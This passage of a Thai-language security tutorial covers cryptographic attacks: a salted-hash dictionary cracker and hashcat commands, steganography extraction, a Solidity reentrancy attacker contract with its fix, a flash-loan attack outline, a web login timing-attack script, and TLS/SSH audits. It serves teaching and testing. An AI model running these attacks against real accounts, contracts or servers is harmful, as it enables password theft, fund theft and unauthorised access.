        for salt, hash_val in [(parts[0], parts[1]), (parts[1], parts[0])]:
            for word in wordlist:
                test = hashlib.sha256((salt + word).encode()).hexdigest()
                if test == hash_val:
                    print(f"[+] Cracked! password='{word}', salt='{salt}'")
                    return word
                test = hashlib.sha256((word + salt).encode()).hexdigest()
                if test == hash_val:
                    print(f"[+] Cracked! password='{word}', salt='{salt}'")
                    return word
        return None
    
    def estimate_crack_time(self, algorithm: str) -> dict:
        """Estimate cracking time for different algorithms"""
        # อัตรา hashes/sec สำหรับ GPU RTX 4090
        gpu_rates = {
            "MD5": 164_000_000_000,        # 164 GH/s
            "SHA-1": 55_000_000_000,       # 55 GH/s
            "SHA-256": 23_000_000_000,     # 23 GH/s
            "NTLM": 300_000_000_000,       # 300 GH/s
            "bcrypt (cost=10)": 102_000,   # 102 KH/s
            "scrypt": 1_500,               # 1.5 KH/s
            "Argon2": 800,                 # 800 H/s
            "PBKDF2-SHA256 (100000)": 3_700_000  # 3.7 MH/s
        }
        
        charset_sizes = {
            "digits (10)": 10,
            "lowercase (26)": 26,
            "alphanumeric (62)": 62,
            "all printable (95)": 95
        }
        
        rate = gpu_rates.get(algorithm, 1_000_000)
        results = {}
        
        for charset_name, charset_size in charset_sizes.items():
            results[charset_name] = {}
            for length in [6, 8, 10, 12]:
                combinations = charset_size ** length
                seconds = combinations / rate
                
                if seconds < 60:
                    time_str = f"{seconds:.1f}s"
                elif seconds < 3600:
                    time_str = f"{seconds/60:.1f}m"
                elif seconds < 86400:
                    time_str = f"{seconds/3600:.1f}h"
                elif seconds < 31536000:
                    time_str = f"{seconds/86400:.1f}d"
                else:
                    time_str = f"{seconds/31536000:.1f}y"
                
                results[charset_name][f"len={length}"] = time_str
        
        return results


# Hashcat command reference
HASHCAT_REFERENCE = """
# Hashcat Hash Types
# -m 0    MD5
# -m 100  SHA1
# -m 1400 SHA256
# -m 1700 SHA512
# -m 1000 NTLM
# -m 3000 LM
# -m 3200 bcrypt
# -m 7400 sha256crypt (Linux $5$)
# -m 1800 sha512crypt (Linux $6$)
# -m 2500 WPA/WPA2
# -m 13100 Kerberoast TGS
# -m 18200 AS-REP Roasting
# -m 16500 JWT HS256
# -m 22000 WPA-PBKDF2-PMKID+EAPOL

# Attack modes
# -a 0  Dictionary
# -a 1  Combinator
# -a 3  Brute-force/mask
# -a 6  Hybrid wordlist+mask
# -a 7  Hybrid mask+wordlist

# Rules
hashcat -a 0 -m 0 hashes.txt rockyou.txt -r rules/best64.rule
hashcat -a 0 -m 0 hashes.txt rockyou.txt -r rules/OneRuleToRuleThemAll.rule

# Mask attack (8 char, uppercase+lowercase+digit)
hashcat -a 3 -m 1000 hashes.txt ?u?l?l?l?l?l?l?d

# Incremental mask
hashcat -a 3 -m 0 hash.txt --increment --increment-min=6 ?a?a?a?a?a?a?a?a

# Hybrid
hashcat -a 6 -m 0 hash.txt rockyou.txt ?d?d?d?d  # word + 4 digits
hashcat -a 7 -m 0 hash.txt ?d?d?d?d rockyou.txt  # 4 digits + word
"""

if __name__ == "__main__":
    cracker = PasswordHashCracker()
    
    # ระบุ hash type
    test_hashes = [
        "5f4dcc3b5aa765d61d8327deb882cf99",  # MD5
        "$2b$12$ABC...",  # bcrypt
        "$6$salt$...",   # SHA-512 crypt
    ]
    for h in test_hashes:
        htype = cracker.identify_hash(h)
        print(f"Hash type: {htype} -> {h[:30]}")
    
    # แสดง crack time estimates
    print("\nCrack time estimates for NTLM (RTX 4090):")
    times = cracker.estimate_crack_time("NTLM")
    for charset, lengths in times.items():
        print(f"  {charset}:")
        for length, time in lengths.items():
            print(f"    {length}: {time}")
    
    print(HASHCAT_REFERENCE)
```

## Step 367: Steganography Detection และ Attacks

การตรวจหาและถอดรหัสข้อมูลที่ซ่อนอยู่ในไฟล์

```python
#!/usr/bin/env python3
# steganography.py - Steganography Detection & Extraction

from PIL import Image
import numpy as np
import struct
import wave
import subprocess
from pathlib import Path

class SteganographyAnalyzer:
    
    def detect_lsb_image(self, image_path: str) -> dict:
        """Detect LSB steganography in images"""
        print(f"[*] Analyzing image for LSB steganography: {image_path}")
        
        img = Image.open(image_path)
        pixels = np.array(img)
        
        findings = {
            "image_size": img.size,
            "mode": img.mode,
            "suspicious": False
        }
        
        # ตรวจหา LSBs ผิดปกติ
        if len(pixels.shape) >= 3:
            lsbs = pixels[:, :, :3] & 1  # Extract LSBs
            lsb_sum = lsbs.sum()
            total_pixels = pixels.shape[0] * pixels.shape[1] * 3
            lsb_ratio = lsb_sum / total_pixels
            
            # ถ้า LSBs ไม่ random อาจมีข้อมูลซ่อน
            findings["lsb_ratio"] = float(lsb_ratio)
            if abs(lsb_ratio - 0.5) < 0.01:
                findings["suspicious"] = True
                print(f"  [!] LSB ratio near 0.5 ({lsb_ratio:.4f}) - possibly steganographic")
        
        return findings
    
    def extract_lsb_image(self, image_path: str) -> bytes:
        """Extract hidden data from LSB steganography"""
        print(f"[*] Extracting LSB data from: {image_path}")
        
        img = Image.open(image_path)
        pixels = np.array(img).flatten()
        
        # Extract LSBs
        lsbs = [pixel & 1 for pixel in pixels]
        
        # Convert bits to bytes
        hidden_bytes = bytearray()
        for i in range(0, len(lsbs) - 7, 8):
            byte = 0
            for bit in lsbs[i:i+8]:
                byte = (byte << 1) | bit
            hidden_bytes.append(byte)
            
            # Check for end marker
            if len(hidden_bytes) > 4 and hidden_bytes[-4:] == b'\x00\x00\x00\x00':
                break
        
        print(f"  [+] Extracted {len(hidden_bytes)} bytes")
        
        # Try to detect file type
        if hidden_bytes[:2] == b'\xff\xd8':
            print("  [+] Hidden data appears to be JPEG")
        elif hidden_bytes[:4] == b'\x89PNG':
            print("  [+] Hidden data appears to be PNG")
        elif hidden_bytes[:2] == b'PK':
            print("  [+] Hidden data appears to be ZIP")
        
        return bytes(hidden_bytes)
    
    def analyze_metadata(self, file_path: str) -> dict:
        """Extract hidden data from file metadata"""
        print(f"[*] Analyzing metadata: {file_path}")
        
        metadata = {}
        
        # EXIF data
        try:
            from PIL.ExifTags import TAGS
            img = Image.open(file_path)
            exif_data = img._getexif() if hasattr(img, '_getexif') else {}
            if exif_data:
                for tag_id, value in exif_data.items():
                    tag = TAGS.get(tag_id, tag_id)
                    metadata[str(tag)] = str(value)[:100]
        except:
            pass
        
        # ExifTool
        try:
            result = subprocess.run(["exiftool", file_path], 
                                  capture_output=True, text=True)
            metadata["exiftool"] = result.stdout
        except:
            pass
        
        # Check for hidden strings
        if Path(file_path).is_file():
            with open(file_path, 'rb') as f:
                content = f.read()
            
            # Look for embedded text
            import re
            strings = re.findall(rb'[ -~]{8,}', content)
            interesting = [s.decode() for s in strings 
                         if any(kw in s.lower() for kw in [b'password', b'secret', b'key', b'flag'])]
            if interesting:
                metadata["interesting_strings"] = interesting
        
        return metadata
    
    def analyze_audio(self, wav_file: str) -> dict:
        """Detect steganography in audio files"""
        print(f"[*] Analyzing audio: {wav_file}")
        
        with wave.open(wav_file, 'rb') as w:
            frames = w.readframes(w.getnframes())
            params = {
                "channels": w.getnchannels(),
                "sample_width": w.getsampwidth(),
                "frame_rate": w.getframerate(),
                "n_frames": w.getnframes()
            }
        
        # Check LSBs of audio samples
        samples = struct.unpack(f"{len(frames)//2}h", frames)
        lsbs = [s & 1 for s in samples]
        
        # Extract hidden text
        hidden_bits = lsbs[:1000]  # First 1000 bits
        hidden_bytes = bytearray()
        for i in range(0, len(hidden_bits) - 7, 8):
            byte = int(''.join(str(b) for b in hidden_bits[i:i+8]), 2)
            if 32 <= byte < 127:  # Printable ASCII
                hidden_bytes.append(byte)
            else:
                break
        
        if hidden_bytes:
            print(f"  [+] Possible hidden text: {hidden_bytes.decode('ascii', errors='ignore')}")
        
        params["possible_hidden"] = hidden_bytes.decode('ascii', errors='ignore')
        return params


# Steganography tools
STEGO_TOOLS = """
# Image Steganography Tools

# Steghide - embed/extract from JPEG, BMP, WAV
steghide embed -cf cover.jpg -sf secret.txt -p password
steghide extract -sf stego.jpg -p password
steghide info stego.jpg  # Check if data hidden

# StegSeek - crack steghide password
stegseek stego.jpg /usr/share/wordlists/rockyou.txt

# Stegsolve (Java GUI)
java -jar Stegsolve.jar
# - View different bit planes
# - Extract data from specific planes
# - Stereogram analysis

# zsteg - PNG/BMP steganography
zsteg image.png        # Auto detect
zsteg -a image.png     # Try all methods
zsteg -e "b1,rgb,lsb" image.png

# stegoveritas - comprehensive detection
stegoveritas image.png

# Binwalk - find embedded files
binwalk -e image.png   # Extract embedded files
binwalk --dd='.*' image.png  # Extract all types

# Exiftool metadata
exiftool file.jpg
exiftool -Comment="hidden data" file.jpg  # Embed in comment

# strings - basic hidden text
strings image.png | grep -E '(flag|CTF|password|secret)'

# foremost - file carving
foremost -t all -i suspicious.jpg -o output/

# Audio Steganography
# mp3stego
MP3Stego/encode -H secret.txt -E stego.mp3 cover.mp3
MP3Stego/decode -X stego.mp3

# DeepSound
# OpenPuff
# Sonic Visualiser (for spectrogram analysis)

# Network Steganography
# covert_tcp - data in TCP ISN
# ncovert - in ICMP fields
"""

if __name__ == "__main__":
    analyzer = SteganographyAnalyzer()
    
    # ตรวจสอบ image
    # findings = analyzer.detect_lsb_image("suspicious.png")
    # data = analyzer.extract_lsb_image("suspicious.png")
    
    print(STEGO_TOOLS)
```

## Step 368: Blockchain และ Smart Contract Security

ความปลอดภัยของ smart contracts และ blockchain applications

```python
#!/usr/bin/env python3
# smart_contract_security.py - Blockchain Security Testing

# ========== Common Smart Contract Vulnerabilities ==========

REENTRANCY_VULNERABLE = """
// Vulnerable Reentrancy Example (Solidity)
contract VulnerableBank {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    // VULNERABLE: State update after external call
    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount);
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] -= amount;  // State updated AFTER transfer!
    }
}

// Attacker contract
contract ReentrancyAttacker {
    VulnerableBank public target;
    
    constructor(address _target) {
        target = VulnerableBank(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    
    // Called repeatedly by withdraw
    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);  // Reenter!
        }
    }
}

// Fixed version
contract SecureBank {
    mapping(address => uint) public balances;
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "Reentrant call");
        locked = true;
        _;
        locked = false;
    }
    
    function withdraw(uint amount) public noReentrant {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;  // State updated BEFORE transfer
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}
"""

INTEGER_OVERFLOW = """
// Integer Overflow (Solidity < 0.8.0)
contract OverflowVulnerable {
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) public {
        // Overflow: if balances[msg.sender] = 0, 0 - 1 = 2^256 - 1!
        balances[msg.sender] -= amount;  // Underflow!
        balances[to] += amount;
    }
}

// Fixed: Solidity 0.8+ has built-in overflow protection
// Or use SafeMath library for older versions
using SafeMath for uint256;
"""

ACCESS_CONTROL = """
// Missing access control
contract Unprotected {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    // VULNERABLE: No access control!
    function changeOwner(address newOwner) public {
        owner = newOwner;
    }
    
    // Fixed:
    function changeOwnerFixed(address newOwner) public {
        require(msg.sender == owner, "Not owner");
        owner = newOwner;
    }
}
"""

# ========== Security Analysis Tools ==========

class SmartContractAnalyzer:
    
    def analyze_with_slither(self, contract_file: str) -> str:
        """Static analysis with Slither"""
        return f"""
# Slither - Static Analyzer
pip install slither-analyzer

# Basic analysis
slither {contract_file}

# Detect specific vulnerabilities
slither {contract_file} --detect reentrancy-eth
slither {contract_file} --detect arbitrary-send
slither {contract_file} --detect unprotected-upgrade

# Print functions/variables
slither {contract_file} --print function-summary
slither {contract_file} --print variables-written

# Export to JSON
slither {contract_file} --json results.json
"""
    
    def analyze_with_mythril(self, contract_file: str) -> str:
        """Dynamic analysis with Mythril"""
        return f"""
# Mythril - Symbolic Execution
pip install mythril

# Analyze local file
myth analyze {contract_file}

# Analyze deployed contract
myth analyze -a 0xContractAddress --rpc mainnet

# Detect specific issues  
myth analyze {contract_file} --swc-blacklist 103,111

# JSON output
myth analyze {contract_file} -o json
"""
    
    def flash_loan_attack_example(self) -> str:
        """Flash loan attack pattern"""
        return """
// Flash Loan Attack Pattern
contract FlashLoanAttacker {
    IFlashLoan flashLoan;
    IDEXProtocol dex;
    IPriceOracle oracle;
    
    function attack() external {
        // 1. Borrow huge amount
        flashLoan.borrow(1_000_000 ether);
        
        // Flash loan callback
        function onFlashLoan(uint amount) external {
            // 2. Manipulate price on DEX (few users)
            dex.swapAll(usdc, weth);  // Crash USDC price
            
            // 3. Exploit protocol using manipulated price
            oracle.getPrice(usdc);  // Returns manipulated price
            protocol.liquidate(victims);  // Profit!
            
            // 4. Restore price
            dex.swapAll(weth, usdc);
            
            // 5. Repay flash loan
            flashLoan.repay(amount + fee);
        }
    }
}
"""
    
    def check_common_vulnerabilities(self) -> dict:
        """Checklist of common smart contract vulnerabilities"""
        return {
            "Reentrancy": {
                "description": "External call before state update",
                "tools": ["Slither", "Mythril"],
                "swc": "SWC-107",
                "fix": "Update state before external calls, use ReentrancyGuard"
            },
            "Integer Overflow/Underflow": {
                "description": "Arithmetic operations without bounds checking",
                "tools": ["Mythril", "Echidna"],
                "swc": "SWC-101",
                "fix": "Use Solidity 0.8+ or SafeMath"
            },
            "Access Control": {
                "description": "Missing or incorrect authorization",
                "tools": ["Slither"],
                "swc": "SWC-105",
                "fix": "Implement onlyOwner, roles, or access control libraries"
            },
            "Front Running": {
                "description": "Transaction ordering manipulation",
                "tools": ["Manual review"],
                "swc": "SWC-114",
                "fix": "Commit-reveal schemes, minimum viable transactions"
            },
            "Oracle Manipulation": {
                "description": "Price oracle can be manipulated",
                "tools": ["Manual review"],
                "swc": "N/A",
                "fix": "Use Chainlink, TWAP oracles"
            },
            "Timestamp Dependence": {
                "description": "Relies on block.timestamp (can be manipulated by miners)",
                "tools": ["Slither"],
                "swc": "SWC-116",
                "fix": "Avoid for critical timing, use block numbers"
            },
            "Gas Griefing": {
                "description": "Attacker can make transactions fail",
                "tools": ["Manual review"],
                "swc": "N/A",
                "fix": "Use proper gas limits, pull over push payments"
            }
        }


if __name__ == "__main__":
    analyzer = SmartContractAnalyzer()
    
    print("=== Smart Contract Security ===")
    print("\nCommon Vulnerabilities:")
    vulns = analyzer.check_common_vulnerabilities()
    for vuln, details in vulns.items():
        print(f"  {vuln}: {details['description']}")
        print(f"    Fix: {details['fix']}")
```

## Step 369: Side-Channel Attacks

การโจมตีผ่าน side channels (timing, power, cache)

```python
#!/usr/bin/env python3
# side_channel_attacks.py - Side Channel Attack Techniques

import time
import hashlib
import statistics
import hmac

class TimingAttacks:
    
    def demonstrate_timing_leak(self):
        """Show timing difference in string comparison"""
        print("[*] Timing Attack Demo: String Comparison")
        
        secret = b"admin123"
        
        def vulnerable_compare(a: bytes, b: bytes) -> bool:
            """Early exit comparison - VULNERABLE"""
            if len(a) != len(b):
                return False
            for x, y in zip(a, b):
                if x != y:
                    return False  # Early exit leaks timing info
            return True
        
        def secure_compare(a: bytes, b: bytes) -> bool:
            """Constant time comparison - SECURE"""
            return hmac.compare_digest(a, b)
        
        # Measure timing for different guesses
        print("\n  Vulnerable comparison timing:")
        guesses = [b"aaaa1111", b"admin111", b"admin12x", b"admin123"]
        
        for guess in guesses:
            times = []
            for _ in range(10000):
                start = time.perf_counter_ns()
                vulnerable_compare(secret, guess)
                end = time.perf_counter_ns()
                times.append(end - start)
            avg = statistics.mean(times)
            print(f"    '{guess.decode()}': avg={avg:.1f}ns")
        
        print("  Note: Different timings reveal correct prefix!")
        print("\n  Secure comparison has constant timing regardless of input")
    
    def timing_attack_web(self):
        """Timing attack on web authentication"""
        print("\n[*] Web Authentication Timing Attack:")
        print("""  
    import requests
    import time
    import statistics
    
    target = 'http://target.com/login'
    
    # Known valid username, test password prefixes
    results = []
    for prefix_len in range(1, 20):
        prefix = 'a' * prefix_len
        times = []
        
        for _ in range(50):  # Multiple samples to reduce noise
            start = time.perf_counter()
            r = requests.post(target, data={'user': 'admin', 'pass': prefix})
            elapsed = time.perf_counter() - start
            times.append(elapsed)
        
        avg = statistics.mean(times)
        results.append((prefix, avg))
        print(f'Prefix {prefix_len:2d}: {avg*1000:.2f}ms')
    
    # Longer response time = matched more characters
    """)
    
    def cache_timing_spectre_demo(self):
        """Spectre-style cache timing (conceptual)"""
        print("\n[*] Spectre/Meltdown Concepts:")
        print("""
    Spectre (CVE-2017-5753/5715):
    - Exploits speculative execution
    - CPU speculatively executes code branches
    - Leaves traces in CPU cache
    - Attacker reads cache state via timing
    - Can read other processes' memory
    
    Meltdown (CVE-2017-5754):
    - Breaks user/kernel memory isolation
    - Allows user process to read kernel memory
    - Fixed by KPTI (Kernel Page Table Isolation)
    
    Attack Flow (Spectre):
    1. Train branch predictor to predict a target branch
    2. Set up 'gadget' that leaks secret via cache
    3. Cause speculative execution of gadget
    4. Measure cache access times to recover secret
    
    Tools:
    - PoC: https://spectreattack.com/spectre.pdf
    - Meltdown PoC: https://meltdownattack.com/meltdown.pdf
    
    Defense:
    - OS patches (KPTI, Retpoline)
    - Microcode updates
    - JIT compiler hardening
    """)
    
    def power_analysis_demo(self):
        """Simple Power Analysis (SPA) concept"""
        print("\n[*] Power Analysis (SPA/DPA) Concepts:")
        print("""
    Simple Power Analysis (SPA):
    - Measure power consumption of device during operation
    - Different operations use different power
    - Visual inspection of power trace reveals algorithm
    - Can recover RSA/ECC private key bits (square vs multiply)
    
    Differential Power Analysis (DPA):
    - Statistical analysis of many power traces
    - Correlate traces with hypothetical key values
    - Find which key value best explains power consumption
    - Recover AES keys from thousands of traces
    
    Tools:
    - ChipWhisperer: Open source hardware for power analysis
    - Inspector: Commercial side-channel tool
    - SCALib: Python library for SCA
    
    Defense:
    - Balanced implementations (constant power)
    - Masking (randomize intermediate values)
    - Hardware shields and filters
    """)


# Fault Injection attacks
FAULT_INJECTION = """
# Fault Injection Attacks

# Voltage Glitching - cause transient fault
# Laser Fault Injection - target specific transistors
# Clock Glitching - skip instruction execution

# Target: Skip 'if (check_password)' check
# Normal execution: check_password() -> fail -> return error
# Glitched: check_password() -> FAULT -> skip branch -> grant access

# Tools:
# - ChipWhisperer (for microcontrollers)
# - HyperFlash toolkit
# - JTAGulator (JTAG/UART discovery)

# Rowhammer Attack (DRAM):
# - Repeatedly access two DRAM rows
# - Causes bit flips in adjacent rows
# - Can flip bits in page tables -> privilege escalation

# rowhammer-test
# git clone https://github.com/google/rowhammer-test
# ./rowhammer_test

# Defense against rowhammer:
# - ECC RAM
# - Memory scrubbing
# - LPDDR4 with Target Row Refresh (TRR)
"""

if __name__ == "__main__":
    attacks = TimingAttacks()
    attacks.demonstrate_timing_leak()
    attacks.timing_attack_web()
    attacks.cache_timing_spectre_demo()
    attacks.power_analysis_demo()
    print(FAULT_INJECTION)
```

## Step 370: Cryptographic Protocol Analysis

การวิเคราะห์ความปลอดภัยของ cryptographic protocols

```python
#!/usr/bin/env python3
# protocol_analysis.py - Cryptographic Protocol Security

import ssl
import socket
import subprocess
from pathlib import Path

class ProtocolAnalyzer:
    
    def analyze_tls_config(self, hostname: str, port: int = 443) -> dict:
        """Analyze TLS configuration"""
        print(f"[*] Analyzing TLS: {hostname}:{port}")
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        findings = {}
        
        # Connect and get certificate
        try:
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    tls_version = ssock.version()
                    
                    findings["tls_version"] = tls_version
                    findings["cipher_suite"] = cipher
                    
                    # Check TLS version
                    if tls_version in ["TLSv1", "TLSv1.1", "SSLv3"]:
                        findings["vulnerable"] = f"Old TLS version: {tls_version}"
                        print(f"  [!] Old TLS version: {tls_version}")
                    
                    # Check cipher strength
                    if cipher and cipher[2] < 128:
                        findings["weak_cipher"] = f"Key bits: {cipher[2]}"
                        print(f"  [!] Weak cipher: {cipher[0]} ({cipher[2]} bits)")
                    
                    if cert:
                        findings["cert_expiry"] = cert.get("notAfter", "N/A")
                        print(f"  Certificate expires: {cert.get('notAfter')}")
        
        except Exception as e:
            findings["error"] = str(e)
        
        return findings
    
    def test_ssh_config(self, hostname: str, port: int = 22) -> dict:
        """Analyze SSH server configuration"""
        print(f"[*] Analyzing SSH: {hostname}:{port}")
        
        findings = {}
        
        # Use ssh-audit
        try:
            result = subprocess.run(
                ["ssh-audit", f"{hostname}:{port}"],
                capture_output=True, text=True, timeout=30
            )
            
            output = result.stdout
            
            # Check for weak algorithms
            weak_kex = ["diffie-hellman-group1-sha1", "diffie-hellman-group14-sha1"]
            weak_ciphers = ["arcfour", "blowfish", "cast128", "3des"]
            weak_macs = ["hmac-md5", "hmac-sha1-96"]
            
            for kex in weak_kex:
                if kex in output:
                    findings.setdefault("weak_kex", []).append(kex)
                    print(f"  [!] Weak KEX: {kex}")
            
            findings["full_output"] = output
            
        except FileNotFoundError:
            print("  ssh-audit not installed: pip install ssh-audit")
            # Manual check
            try:
                sock = socket.create_connection((hostname, port), timeout=5)
                banner = sock.recv(256).decode('utf-8', errors='ignore').strip()
                sock.close()
                findings["banner"] = banner
                print(f"  SSH Banner: {banner}")
            except:
                pass
        
        return findings
    
    def check_certificate_transparency(self, domain: str) -> list:
        """Check Certificate Transparency logs"""
        import urllib.request
        import json
        
        print(f"[*] Checking CT logs for: {domain}")
        
        subdomains = []
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(req, timeout=15) as response:
                data = json.loads(response.read())
            
            for entry in data[:20]:
                name = entry.get("name_value", "")
                for subdomain in name.split("\n"):
                    subdomain = subdomain.strip()
                    if subdomain and subdomain not in subdomains:
                        subdomains.append(subdomain)
        
        except Exception as e:
            print(f"  Error: {e}")
        
        return subdomains
    
    def analyze_tls_config_file(self, config_file: str) -> list:
        """Analyze TLS configuration files (nginx, apache, etc.)"""
        findings = []
        
        weak_configs = {
            "SSLv2": "SSL 2.0 enabled - DROWN vulnerable",
            "SSLv3": "SSL 3.0 enabled - POODLE vulnerable",
            "TLSv1.0": "TLS 1.0 enabled - BEAST vulnerable",
            "TLSv1.1": "TLS 1.1 enabled - deprecated",
            "RC4": "RC4 cipher enabled - biased keystream",
            "DES": "DES cipher enabled - 56-bit key",
            "NULL": "NULL cipher - no encryption",
            "EXPORT": "EXPORT ciphers enabled - LOGJAM/FREAK",
            "ssl_verify_client off": "Client certificate verification disabled"
        }
        
        try:
            with open(config_file, 'r') as f:
                content = f.read()
            
            for pattern, description in weak_configs.items():
                if pattern in content:
                    findings.append({
                        "issue": pattern,
                        "description": description,
                        "severity": "High"
                    })
                    print(f"  [!] {description}")
        
        except FileNotFoundError:
            print(f"  File not found: {config_file}")
        
        return findings


# Cryptographic tools summary
CRYPTO_TOOLS_SUMMARY = """
=== Cryptographic Attack Tools Summary ===

| Tool | Purpose | Usage |
|------|---------|-------|
| hashcat | Password hash cracking | hashcat -m <type> hash.txt wordlist.txt |
| john | Password cracking | john --format=<format> hash.txt |
| RsaCtfTool | RSA attacks | python3 RsaCtfTool.py --publickey key.pem |
| testssl.sh | TLS scanning | testssl.sh target.com:443 |
| sslyze | SSL analysis | sslyze --regular target.com |
| openssl | Manual TLS testing | openssl s_client -connect target:443 |
| jwt_tool | JWT attacks | jwt_tool <token> -X a |
| padBuster | Padding oracle | padBuster.py <url> <cipher> 16 |
| hashpump | Length extension | hashpump -s <hash> -d <data> -a <append> |
| steghide | Steganography | steghide extract -sf stego.jpg |
| binwalk | File carving | binwalk -e suspicious.png |
| slither | Smart contract audit | slither contract.sol |
| mythril | Smart contract analysis | myth analyze contract.sol |
| ssh-audit | SSH configuration | ssh-audit target.com |

=== Common Hashcat Modes ===

0     MD5
100   SHA1
1000  NTLM
1400  SHA-256
1700  SHA-512
3000  LM
3200  bcrypt
7400  sha256crypt
1800  sha512crypt
2500  WPA/WPA2
13100 Kerberoast
18200 AS-REP
16500 JWT
"""

if __name__ == "__main__":
    analyzer = ProtocolAnalyzer()
    
    # Example usage (requires actual target)
    # analyzer.analyze_tls_config("example.com")
    # analyzer.test_ssh_config("example.com")
    
    # Check CT logs
    # subdomains = analyzer.check_certificate_transparency("example.com")
    # for sub in subdomains[:10]:
    #     print(f"  Found: {sub}")
    
    print(CRYPTO_TOOLS_SUMMARY)
```

---
*Part 37 ครอบคลุม Steps 361-370: Cryptography Attacks รวมถึง crypto fundamentals & weaknesses, padding oracle attack, RSA attacks (Wiener/Fermat/common modulus/low exponent), TLS/SSL attacks (HEARTBLEED/POODLE/BEAST/CRIME/ROBOT), JWT attacks (none alg/algorithm confusion/kid injection), password hash cracking, steganography detection, blockchain/smart contract security, side-channel attacks และ cryptographic protocol analysis*
